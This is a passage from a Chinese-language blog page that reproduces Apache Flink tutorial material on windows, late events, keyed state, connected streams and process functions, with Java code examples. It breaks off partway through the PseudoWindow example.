<li>处理时间，即事件被处理的时间。处理时间其实就是处理事件的机器所测量的时间。</li>
<li>通常还有第 3 个时间概念，即摄取时间，也叫作进入时间。它指的是事件进入流处理框架的时间。缺乏真实事件时间的数据会被流处理器附上时间戳，即流处理器第一次看到它的时间（这个操作由 source 函数完成，它是程序的第一个处理节点）。</li>
</ul>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>在本节中，我们将学习：</p>
<ul>
<li>如何使用窗口来计算无界流上的聚合,</li>
<li>Flink 支持哪种类型的窗口，以及</li>
<li>如何使用窗口聚合来实现 DataStream 程序</li>
</ul>
<h3 id="概要-1"><a href="#概要-1" class="headerlink" title="概要"></a>概要</h3><p>我们在操作无界数据流时，经常需要应对以下问题，我们经常把无界数据流分解成有界数据流聚合分析:</p>
<ul>
<li>每分钟的浏览量</li>
<li>每位用户每周的会话数</li>
<li>每个传感器每分钟的最高温度</li>
</ul>
<p>用 Flink 计算窗口分析取决于两个主要的抽象操作：<em>Window Assigners</em>，将事件分配给窗口（根据需要创建新的窗口对象），以及 <em>Window Functions</em>，处理窗口内的数据。</p>
<p>Flink 的窗口 API 还具有 <em>Triggers</em> 和 <em>Evictors</em> 的概念，<em>Triggers</em> 确定何时调用窗口函数，而 <em>Evictors</em> 则可以删除在窗口中收集的元素。</p>
<p>举一个简单的例子，我们一般这样使用键控事件流（基于 key 分组的输入事件流）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">stream.</span><br><span class="line">    .keyBy(&lt;key selector&gt;)</span><br><span class="line">    .window(&lt;window assigner&gt;)</span><br><span class="line">    .reduce|aggregate|process(&lt;window function&gt;)</span><br></pre></td></tr></table></figure>

<p>您不是必须使用键控事件流（keyed stream），但是值得注意的是，如果不使用键控事件流，我们的程序就不能 <em>并行</em> 处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">stream.</span><br><span class="line">    .windowAll(&lt;window assigner&gt;)</span><br><span class="line">    .reduce|aggregate|process(&lt;window function&gt;)</span><br></pre></td></tr></table></figure>

<h3 id="窗口分配器"><a href="#窗口分配器" class="headerlink" title="窗口分配器"></a>窗口分配器</h3><p>Flink 有一些内置的窗口分配器，如下所示：</p>
<p><img src="https://ci.apache.org/projects/flink/flink-docs-release-1.13/fig/window-assigners.svg" alt="Window assigners"></p>
<p>通过一些示例来展示关于这些窗口如何使用，或者如何区分它们：</p>
<ul>
<li>滚动时间窗口<ul>
<li><em>每分钟页面浏览量</em></li>
<li><code>TumblingEventTimeWindows.of(Time.minutes(1))</code></li>
</ul>
</li>
<li>滑动时间窗口<ul>
<li><em>每10秒钟计算前1分钟的页面浏览量</em></li>
<li><code>SlidingEventTimeWindows.of(Time.minutes(1), Time.seconds(10))</code></li>
</ul>
</li>
<li>会话窗口<ul>
<li><em>每个会话的网页浏览量，其中会话之间的间隔至少为30分钟</em></li>
<li><code>EventTimeSessionWindows.withGap(Time.minutes(30))</code></li>
</ul>
</li>
</ul>
<p>以下都是一些可以使用的间隔时间 <code>Time.milliseconds(n)</code>, <code>Time.seconds(n)</code>, <code>Time.minutes(n)</code>, <code>Time.hours(n)</code>, 和 <code>Time.days(n)</code>。</p>
<p>基于时间的窗口分配器（包括会话时间）既可以处理 <code>事件时间</code>，也可以处理 <code>处理时间</code>。这两种基于时间的处理没有哪一个更好，我们必须折衷。使用 <code>处理时间</code>，我们必须接受以下限制：</p>
<ul>
<li>无法正确处理历史数据,</li>
<li>无法正确处理超过最大无序边界的数据,</li>
<li>结果将是不确定的,</li>
</ul>
<p>但是有自己的优势，较低的延迟。</p>
<p>使用基于计数的窗口时，请记住，只有窗口内的事件数量到达窗口要求的数值时，这些窗口才会触发计算。尽管可以使用自定义触发器自己实现该行为，但无法应对超时和处理部分窗口。</p>
<p>我们可能在有些场景下，想使用全局 window assigner 将每个事件（相同的 key）都分配给某一个指定的全局窗口。 很多情况下，一个比较好的建议是使用 <code>ProcessFunction</code>，具体介绍在<a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/learn-flink/event_driven/#process-functions">这里</a>。</p>
<h3 id="窗口应用函数"><a href="#窗口应用函数" class="headerlink" title="窗口应用函数"></a>窗口应用函数</h3><p>我们有三种最基本的操作窗口内的事件的选项:</p>
<ol>
<li>像批量处理，<code>ProcessWindowFunction</code> 会缓存 <code>Iterable</code> 和窗口内容，供接下来全量计算；</li>
<li>或者像流处理，每一次有事件被分配到窗口时，都会调用 <code>ReduceFunction</code> 或者 <code>AggregateFunction</code> 来增量计算；</li>
<li>或者结合两者，通过 <code>ReduceFunction</code> 或者 <code>AggregateFunction</code> 预聚合的增量计算结果在触发窗口时， 提供给 <code>ProcessWindowFunction</code> 做全量计算。</li>
</ol>
<p>接下来展示一段 1 和 3 的示例，每一个实现都是计算传感器的最大值。在每一个一分钟大小的事件时间窗口内, 生成一个包含 <code>(key,end-of-window-timestamp, max_value)</code> 的一组结果。</p>
<h4 id="ProcessWindowFunction-示例"><a href="#ProcessWindowFunction-示例" class="headerlink" title="ProcessWindowFunction 示例"></a>ProcessWindowFunction 示例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DataStream&lt;SensorReading&gt; input = ...</span><br><span class="line"></span><br><span class="line">input</span><br><span class="line">    .keyBy(x -&gt; x.key)</span><br><span class="line">    .window(TumblingEventTimeWindows.of(Time.minutes(<span class="number">1</span>)))</span><br><span class="line">    .process(<span class="keyword">new</span> MyWastefulMax());</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyWastefulMax</span> <span class="keyword">extends</span> <span class="title">ProcessWindowFunction</span>&lt;</span></span><br><span class="line"><span class="class">        <span class="title">SensorReading</span>,                  // 输入类型</span></span><br><span class="line"><span class="class">        <span class="title">Tuple3</span>&lt;<span class="title">String</span>, <span class="title">Long</span>, <span class="title">Integer</span>&gt;,  // 输出类型</span></span><br><span class="line"><span class="class">        <span class="title">String</span>,                         // 键类型</span></span><br><span class="line"><span class="class">        <span class="title">TimeWindow</span>&gt; </span>&#123;                   <span class="comment">// 窗口类型</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">            String key,</span></span></span><br><span class="line"><span class="params"><span class="function">            Context context,</span></span></span><br><span class="line"><span class="params"><span class="function">            Iterable&lt;SensorReading&gt; events,</span></span></span><br><span class="line"><span class="params"><span class="function">            Collector&lt;Tuple3&lt;String, Long, Integer&gt;&gt; out)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (SensorReading event : events) &#123;</span><br><span class="line">            max = Math.max(event.value, max);</span><br><span class="line">        &#125;</span><br><span class="line">        out.collect(Tuple3.of(key, context.window().getEnd(), max));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在当前实现中有一些值得关注的地方：</p>
<ul>
<li>Flink 会缓存所有分配给窗口的事件流，直到触发窗口为止。这个操作可能是相当昂贵的。</li>
<li>Flink 会传递给 <code>ProcessWindowFunction</code> 一个 <code>Context</code> 对象，这个对象内包含了一些窗口信息。<code>Context</code> 接口 展示大致如下:</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Context</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> W <span class="title">window</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">long</span> <span class="title">currentProcessingTime</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">long</span> <span class="title">currentWatermark</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> KeyedStateStore <span class="title">windowState</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> KeyedStateStore <span class="title">globalState</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>windowState</code> 和 <code>globalState</code> 可以用来存储当前的窗口的 key、窗口或者当前 key 的每一个窗口信息。这在一些场景下会很有用，试想，我们在处理当前窗口的时候，可能会用到上一个窗口的信息。</p>
<h4 id="增量聚合示例"><a href="#增量聚合示例" class="headerlink" title="增量聚合示例"></a>增量聚合示例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DataStream&lt;SensorReading&gt; input = ...</span><br><span class="line"></span><br><span class="line">input</span><br><span class="line">    .keyBy(x -&gt; x.key)</span><br><span class="line">    .window(TumblingEventTimeWindows.of(Time.minutes(<span class="number">1</span>)))</span><br><span class="line">    .reduce(<span class="keyword">new</span> MyReducingMax(), <span class="keyword">new</span> MyWindowFunction());</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyReducingMax</span> <span class="keyword">implements</span> <span class="title">ReduceFunction</span>&lt;<span class="title">SensorReading</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> SensorReading <span class="title">reduce</span><span class="params">(SensorReading r1, SensorReading r2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> r1.value() &gt; r2.value() ? r1 : r2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyWindowFunction</span> <span class="keyword">extends</span> <span class="title">ProcessWindowFunction</span>&lt;</span></span><br><span class="line"><span class="class">    <span class="title">SensorReading</span>, <span class="title">Tuple3</span>&lt;<span class="title">String</span>, <span class="title">Long</span>, <span class="title">SensorReading</span>&gt;, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">            String key,</span></span></span><br><span class="line"><span class="params"><span class="function">            Context context,</span></span></span><br><span class="line"><span class="params"><span class="function">            Iterable&lt;SensorReading&gt; maxReading,</span></span></span><br><span class="line"><span class="params"><span class="function">            Collector&lt;Tuple3&lt;String, Long, SensorReading&gt;&gt; out)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        SensorReading max = maxReading.iterator().next();</span><br><span class="line">        out.collect(Tuple3.of(key, context.window().getEnd(), max));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请注意 <code>Iterable&lt;SensorReading&gt;</code> 将只包含一个读数 – <code>MyReducingMax</code> 计算出的预先汇总的最大值。</p>
<h4 id="晚到的事件"><a href="#晚到的事件" class="headerlink" title="晚到的事件"></a>晚到的事件</h4><p>默认场景下，超过最大无序边界的事件会被删除，但是 Flink 给了我们两个选择去控制这些事件。</p>
<p>您可以使用一种称为<a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/learn-flink/event_driven/#side-outputs">旁路输出</a> 的机制来安排将要删除的事件收集到侧输出流中，这里是一个示例:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">OutputTag&lt;Event&gt; lateTag = <span class="keyword">new</span> OutputTag&lt;Event&gt;(<span class="string">&quot;late&quot;</span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">SingleOutputStreamOperator&lt;Event&gt; result = stream.</span><br><span class="line">    .keyBy(...)</span><br><span class="line">    .window(...)</span><br><span class="line">    .sideOutputLateData(lateTag)</span><br><span class="line">    .process(...);</span><br><span class="line"></span><br><span class="line">DataStream&lt;Event&gt; lateStream = result.getSideOutput(lateTag);</span><br></pre></td></tr></table></figure>

<p>我们还可以指定 <em>允许的延迟(allowed lateness)</em> 的间隔，在这个间隔时间内，延迟的事件将会继续分配给窗口（同时状态会被保留），默认状态下，每个延迟事件都会导致窗口函数被再次调用（有时也称之为 <em>late firing</em> ）。</p>
<p>默认情况下，允许的延迟为 0。换句话说，watermark 之后的元素将被丢弃（或发送到侧输出流）。</p>
<p>举例说明:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">stream.</span><br><span class="line">    .keyBy(...)</span><br><span class="line">    .window(...)</span><br><span class="line">    .allowedLateness(Time.seconds(<span class="number">10</span>))</span><br><span class="line">    .process(...);</span><br></pre></td></tr></table></figure>

<p>当允许的延迟大于零时，只有那些超过最大无序边界以至于会被丢弃的事件才会被发送到侧输出流（如果已配置）。</p>
<h2 id="数据管道-amp-ETL"><a href="#数据管道-amp-ETL" class="headerlink" title="数据管道 &amp; ETL"></a>数据管道 &amp; ETL</h2><h3 id="有状态的转换"><a href="#有状态的转换" class="headerlink" title="有状态的转换"></a>有状态的转换</h3><h4 id="Flink-为什么要参与状态管理？"><a href="#Flink-为什么要参与状态管理？" class="headerlink" title="Flink 为什么要参与状态管理？"></a>Flink 为什么要参与状态管理？</h4><p>在 Flink 不参与管理状态的情况下，你的应用也可以使用状态，但 Flink 为其管理状态提供了一些引人注目的特性：</p>
<ul>
<li><strong>本地性</strong>: Flink 状态是存储在使用它的机器本地的，并且可以以内存访问速度来获取</li>
<li><strong>持久性</strong>: Flink 状态是容错的，例如，它可以自动按一定的时间间隔产生 checkpoint，并且在任务失败后进行恢复</li>
<li><strong>纵向可扩展性</strong>: Flink 状态可以存储在集成的 RocksDB 实例中，这种方式下可以通过增加本地磁盘来扩展空间</li>
<li><strong>横向可扩展性</strong>: Flink 状态可以随着集群的扩缩容重新分布</li>
<li><strong>可查询性</strong>: Flink 状态可以通过使用 <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/fault-tolerance/queryable_state/">状态查询 API</a> 从外部进行查询。</li>
</ul>
<p>在本节中你将学习如何使用 Flink 的 API 来管理 keyed state。</p>
<h4 id="Rich-Functions"><a href="#Rich-Functions" class="headerlink" title="Rich Functions"></a>Rich Functions</h4><p>至此，你已经看到了 Flink 的几种函数接口，包括 <code>FilterFunction</code>， <code>MapFunction</code>，和 <code>FlatMapFunction</code>。这些都是单一抽象方法模式。</p>
<p>对其中的每一个接口，Flink 同样提供了一个所谓 “rich” 的变体，如 <code>RichFlatMapFunction</code>，其中增加了以下方法，包括：</p>
<ul>
<li><code>open(Configuration c)</code></li>
<li><code>close()</code></li>
<li><code>getRuntimeContext()</code></li>
</ul>
<p><code>open()</code> 仅在算子初始化时调用一次。可以用来加载一些静态数据，或者建立外部服务的链接等。</p>
<p><code>getRuntimeContext()</code> 为整套潜在有趣的东西提供了一个访问途径，最明显的，它是你创建和访问 Flink 状态的途径。</p>
<h4 id="一个使用-Keyed-State-的例子"><a href="#一个使用-Keyed-State-的例子" class="headerlink" title="一个使用 Keyed State 的例子"></a>一个使用 Keyed State 的例子</h4><p>在这个例子里，想象你有一个要去重的事件数据流，对每个键只保留第一个事件。下面是完成这个功能的应用，使用一个名为 <code>Deduplicator</code> 的 <code>RichFlatMapFunction</code> ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Event</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String key;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">long</span> timestamp;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">  </span><br><span class="line">    env.addSource(<span class="keyword">new</span> EventSource())</span><br><span class="line">        .keyBy(e -&gt; e.key)</span><br><span class="line">        .flatMap(<span class="keyword">new</span> Deduplicator())</span><br><span class="line">        .print();</span><br><span class="line">  </span><br><span class="line">    env.execute();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了实现这个功能，<code>Deduplicator</code> 需要记录每个键是否已经有了相应的记录。它将通过使用 Flink 的 <em>keyed state</em> 接口来做这件事。</p>
<p>当你使用像这样的 keyed stream 的时候，Flink 会为每个状态中管理的条目维护一个键值存储。</p>
<p>Flink 支持几种不同方式的 keyed state，这个例子使用的是最简单的一个，叫做 <code>ValueState</code>。意思是对于 <em>每个键</em> ，Flink 将存储一个单一的对象 —— 在这个例子中，存储的是一个 <code>Boolean</code> 类型的对象。</p>
<p>我们的 <code>Deduplicator</code> 类有两个方法：<code>open()</code> 和 <code>flatMap()</code>。<code>open()</code> 方法通过定义 <code>ValueStateDescriptor&lt;Boolean&gt;</code> 建立了管理状态的使用。构造器的参数定义了这个状态的名字（“keyHasBeenSeen”），并且为如何序列化这些对象提供了信息（在这个例子中的 <code>Types.BOOLEAN</code>）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Deduplicator</span> <span class="keyword">extends</span> <span class="title">RichFlatMapFunction</span>&lt;<span class="title">Event</span>, <span class="title">Event</span>&gt; </span>&#123;</span><br><span class="line">    ValueState&lt;Boolean&gt; keyHasBeenSeen;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration conf)</span> </span>&#123;</span><br><span class="line">        ValueStateDescriptor&lt;Boolean&gt; desc = <span class="keyword">new</span> ValueStateDescriptor&lt;&gt;(<span class="string">&quot;keyHasBeenSeen&quot;</span>, Types.BOOLEAN);</span><br><span class="line">        keyHasBeenSeen = getRuntimeContext().getState(desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap</span><span class="params">(Event event, Collector&lt;Event&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (keyHasBeenSeen.value() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            out.collect(event);</span><br><span class="line">            keyHasBeenSeen.update(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当 flatMap 方法调用 <code>keyHasBeenSeen.value()</code> 时，Flink 会在 <em>当前键的上下文</em> 中检索状态值，只有当状态为 <code>null</code> 时，才会输出当前事件。这种情况下，它同时也将更新 <code>keyHasBeenSeen</code> 为 <code>true</code>。</p>
<p>这种访问和更新按键分区的状态的机制也许看上去很神奇，因为在 <code>Deduplicator</code> 的实现中，键不是明确可见的。当 Flink 运行时调用 <code>RichFlatMapFunction</code> 的 <code>open</code> 方法时， 是没有事件的，所以这个时候上下文中不含有任何键。但当它调用 <code>flatMap</code> 方法，被处理的事件的键在运行时中就是可用的了，并且被用来确定操作哪个 Flink 状态后端的入口。</p>
<p>部署在分布式集群时，将会有很多 <code>Deduplicator</code> 的实例，每一个实例将负责整个键空间的互斥子集中的一个。所以，当你看到一个单独的 <code>ValueState</code>，比如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ValueState&lt;Boolean&gt; keyHasBeenSeen;</span><br></pre></td></tr></table></figure>

<p>要理解这个代表的不仅仅是一个单独的布尔类型变量，而是一个分布式的共享键值存储。</p>
<h4 id="清理状态"><a href="#清理状态" class="headerlink" title="清理状态"></a>清理状态</h4><p>上面例子有一个潜在的问题：当键空间是无界的时候将发生什么？Flink 会对每个使用过的键都存储一个 <code>Boolean</code> 类型的实例。如果是键是有限的集合还好，但在键无限增长的应用中，清除再也不会使用的状态是很必要的。这通过在状态对象上调用 <code>clear()</code> 来实现，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">keyHasBeenSeen.clear()</span><br></pre></td></tr></table></figure>

<p>对一个给定的键值，你也许想在它一段时间不使用后来做这件事。当学习 <code>ProcessFunction</code> 的相关章节时，你将看到在事件驱动的应用中怎么用定时器来做这个。</p>
<p>也可以选择使用 <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/fault-tolerance/state/#state-time-to-live-ttl">状态的过期时间（TTL）</a>，为状态描述符配置你想要旧状态自动被清除的时间。</p>
<h3 id="Connected-Streams"><a href="#Connected-Streams" class="headerlink" title="Connected Streams"></a>Connected Streams</h3><p>相比于下面这种预先定义的转换：</p>
<p><img src="https://ci.apache.org/projects/flink/flink-docs-release-1.13/fig/transformation.svg" alt="simple transformation"></p>
<p>有时你想要更灵活地调整转换的某些功能，比如数据流的阈值、规则或者其他参数。Flink 支持这种需求的模式称为 <em>connected streams</em> ，一个单独的算子有两个输入流。</p>
<p><img src="https://ci.apache.org/projects/flink/flink-docs-release-1.13/fig/connected-streams.svg" alt="connected streams"></p>
<p>connected stream 也可以被用来实现流的关联。</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>在这个例子中，一个控制流是用来指定哪些词需要从 <code>streamOfWords</code> 里过滤掉的。 一个称为 <code>ControlFunction</code> 的 <code>RichCoFlatMapFunction</code> 作用于连接的流来实现这个功能。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">    DataStream&lt;String&gt; control = env</span><br><span class="line">        .fromElements(<span class="string">&quot;DROP&quot;</span>, <span class="string">&quot;IGNORE&quot;</span>)</span><br><span class="line">        .keyBy(x -&gt; x);</span><br><span class="line"></span><br><span class="line">    DataStream&lt;String&gt; streamOfWords = env</span><br><span class="line">        .fromElements(<span class="string">&quot;Apache&quot;</span>, <span class="string">&quot;DROP&quot;</span>, <span class="string">&quot;Flink&quot;</span>, <span class="string">&quot;IGNORE&quot;</span>)</span><br><span class="line">        .keyBy(x -&gt; x);</span><br><span class="line">  </span><br><span class="line">    control</span><br><span class="line">        .connect(streamOfWords)</span><br><span class="line">        .flatMap(<span class="keyword">new</span> ControlFunction())</span><br><span class="line">        .print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里注意两个流只有键一致的时候才能连接。 <code>keyBy</code> 的作用是将流数据分区，当 keyed stream 被连接时，他们必须按相同的方式分区。这样保证了两个流中所有键相同的事件发到同一个实例上。这样也使按键关联两个流成为可能。</p>
<p>在这个例子中，两个流都是 <code>DataStream&lt;String&gt;</code> 类型的，并且都将字符串作为键。正如你将在下面看到的，<code>RichCoFlatMapFunction</code> 在状态中存了一个布尔类型的变量，这个变量被两个流共享。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ControlFunction</span> <span class="keyword">extends</span> <span class="title">RichCoFlatMapFunction</span>&lt;<span class="title">String</span>, <span class="title">String</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ValueState&lt;Boolean&gt; blocked;</span><br><span class="line">      </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration config)</span> </span>&#123;</span><br><span class="line">        blocked = getRuntimeContext()</span><br><span class="line">            .getState(<span class="keyword">new</span> ValueStateDescriptor&lt;&gt;(<span class="string">&quot;blocked&quot;</span>, Boolean.class));</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap1</span><span class="params">(String control_value, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        blocked.update(Boolean.TRUE);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap2</span><span class="params">(String data_value, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (blocked.value() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            out.collect(data_value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>RichCoFlatMapFunction</code> 是一种可以被用于一对连接流的 <code>FlatMapFunction</code>，并且它可以调用 rich function 的接口。这意味着它可以是有状态的。</p>
<p>布尔变量 <code>blocked</code> 被用于记录在数据流 <code>control</code> 中出现过的键（在这个例子中是单词），并且这些单词从 <code>streamOfWords</code> 过滤掉。这是 <em>keyed</em> state，并且它是被两个流共享的，这也是为什么两个流必须有相同的键值空间。</p>
<p>在 Flink 运行时中，<code>flatMap1</code> 和 <code>flatMap2</code> 在连接流有新元素到来时被调用 —— 在我们的例子中，<code>control</code> 流中的元素会进入 <code>flatMap1</code>，<code>streamOfWords</code> 中的元素会进入 <code>flatMap2</code>。这是由两个流连接的顺序决定的，本例中为 <code>control.connect(streamOfWords)</code>。</p>
<h2 id="事件驱动应用"><a href="#事件驱动应用" class="headerlink" title="事件驱动应用"></a>事件驱动应用</h2><h3 id="处理函数（Process-Functions）"><a href="#处理函数（Process-Functions）" class="headerlink" title="处理函数（Process Functions）"></a>处理函数（Process Functions）</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><code>ProcessFunction</code> 将事件处理与 Timer，State 结合在一起，使其成为流处理应用的强大构建模块。 这是使用 Flink 创建事件驱动应用程序的基础。它和 <code>RichFlatMapFunction</code> 十分相似， 但是增加了 Timer。</p>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>如果你已经体验了 <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/learn-flink/streaming_analytics/">流式分析训练</a> 的<a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/learn-flink/streaming_analytics/#hands-on">动手实践</a>， 你应该记得，它是采用 <code>TumblingEventTimeWindow</code> 来计算每个小时内每个司机的小费总和， 像下面的示例这样：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算每个司机每小时的小费总和</span></span><br><span class="line">DataStream&lt;Tuple3&lt;Long, Long, Float&gt;&gt; hourlyTips = fares</span><br><span class="line">        .keyBy((TaxiFare fare) -&gt; fare.driverId)</span><br><span class="line">        .window(TumblingEventTimeWindows.of(Time.hours(<span class="number">1</span>)))</span><br><span class="line">        .process(<span class="keyword">new</span> AddTips());</span><br></pre></td></tr></table></figure>

<p>使用 <code>KeyedProcessFunction</code> 去实现相同的操作更加直接且更有学习意义。 让我们开始用以下代码替换上面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算每个司机每小时的小费总和</span></span><br><span class="line">DataStream&lt;Tuple3&lt;Long, Long, Float&gt;&gt; hourlyTips = fares</span><br><span class="line">        .keyBy((TaxiFare fare) -&gt; fare.driverId)</span><br><span class="line">        .process(<span class="keyword">new</span> PseudoWindow(Time.hours(<span class="number">1</span>)));</span><br></pre></td></tr></table></figure>

<p>在这个代码片段中，一个名为 <code>PseudoWindow</code> 的 <code>KeyedProcessFunction</code> 被应用于 KeyedStream， 其结果是一个 <code>DataStream&lt;Tuple3&lt;Long, Long, Float&gt;&gt;</code> （与使用 Flink 内置时间窗口的实现生成的流相同）。</p>
<p><code>PseudoWindow</code> 的总体轮廓示意如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在时长跨度为一小时的窗口中计算每个司机的小费总和。</span></span><br><span class="line"><span class="comment">// 司机ID作为 key。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PseudoWindow</span> <span class="keyword">extends</span> </span></span><br><span class="line"><span class="class">        <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">TaxiFare</span>, <span class="title">Tuple3</span>&lt;<span class="title">Long</span>, <span class="title">Long</span>, <span class="title">Float</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> durationMsec;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PseudoWindow</span><span class="params">(Time duration)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.durationMsec = duration.toMilliseconds();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 